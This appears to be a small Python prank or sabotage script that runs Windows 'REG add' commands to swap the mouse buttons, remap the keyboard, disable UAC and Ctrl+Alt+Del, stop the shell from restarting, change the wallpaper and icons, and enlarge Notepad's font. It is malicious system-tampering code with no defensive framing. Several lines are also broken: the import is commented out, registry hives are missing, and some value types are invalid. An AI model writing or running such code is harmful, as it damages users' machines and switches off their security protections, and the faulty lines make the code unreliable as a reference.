#import subprocess

subprocess.call('REG add "Control Panel\\Mouse" /v SwapMouseButtons /t REG_STRING /d 1 /f', shell=True)

subprocess.call('REG add "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d hax_value /f', shell=True)

subprocess.call('REG add "Control Panel\\Desktop" /v AutoColorization /t REG_DWORD /d 1 /f', shell=True)

subprocess.call('REG add "Control Panel\\Desktop" /v WallPaper /t REG_STRING /d @"C:\\ProgramData\\Microsoft\\User Account Pictures\\background.jpg" /f', shell=True)

subprocess.call('REG add SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v shutdownwithoutlogon /t REG_DWORD /d 0 /f', shell=True)

subprocess.call('REG add SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f', shell=True)

subprocess.call('REG add SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v UseDefaultTile /t REG_DWORD /d 1 /f', shell=True)

subprocess.call('REG add SOFTWARE\\Policies\\Microsoft\\Windows\\System /v DisableLogonBackgroundImage /t REG_DOWORD /d 1 /f', shell=True)

subprocess.call('REG add "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v AutoRestartShell /t REG_DWORD /d 0 /f', shell=True)

subprocess.call('REG add "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DisableCAD /t REG_DWORD /d 1 /f', shell=True)

subprocess.call('REG add Unknown\\DefaultIcon /v @"C:\\ProgramData\\Microsoft\\User Account Pictures\\kill.ico" /t REG_STRING /d 1 /f', shell=True)

subprocess.call('REG add SOFTWARE\\Microsoft\\Notepad /v iPointSize /t REG_DWORD /d 200 /f', shell=True)